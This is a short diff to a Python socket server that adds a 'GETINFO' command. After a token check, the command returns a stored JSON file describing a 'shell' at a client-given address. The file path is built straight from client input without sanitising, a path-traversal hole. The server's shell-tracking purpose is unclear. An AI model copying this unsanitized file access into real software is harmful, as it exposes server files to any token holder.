@@ -177,3 +177,25 @@ while True:
             print(f"{clock} ({external_ip}): Invalid token, denying session.")
             conn.send(b"NO")
 
+    elif command[:7] == "GETINFO":
+        token = command[7:39]
+        shell_addr = command[39:]
+        
+        print(f"GET INFO ({token}) -> {shell_addr}")
+        print(f"{clock} ({external_ip}): Checking token...")
+
+        if validate_token(token):
+            print(f"{clock} ({external_ip}): Token OK. Proceeding.")
+            
+            conn.send(b"OK")
+            
+            ADDRESS, PORT = shell_addr.split(":")
+            PORT = int(PORT)
+            print(f"{clock} ({external_ip}): Searching for shell json file...")
+            
+            file = open(f'info/{ADDRESS}.json').read()
+            size = len(file)
+            conn.send(str(size).encode())
+
+            conn.send(file.encode())
+    
